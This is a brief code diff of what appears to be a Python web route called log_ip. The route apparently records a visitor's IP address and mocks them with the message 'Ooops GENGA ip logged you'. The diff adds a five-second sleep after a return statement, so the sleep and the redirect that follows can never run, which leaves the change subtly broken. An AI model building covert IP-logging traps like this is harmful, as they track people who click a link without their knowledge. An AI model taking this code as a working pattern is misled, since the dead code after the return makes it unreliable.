@@ -33,6 +33,8 @@ def log_ip():
 
     return "Ooops GENGA ip logged you😂"
 
+    time.sleep(5)
+
     return redirect("https://gengaog.github.io/-/")
 
 if __name__ == "__main__":
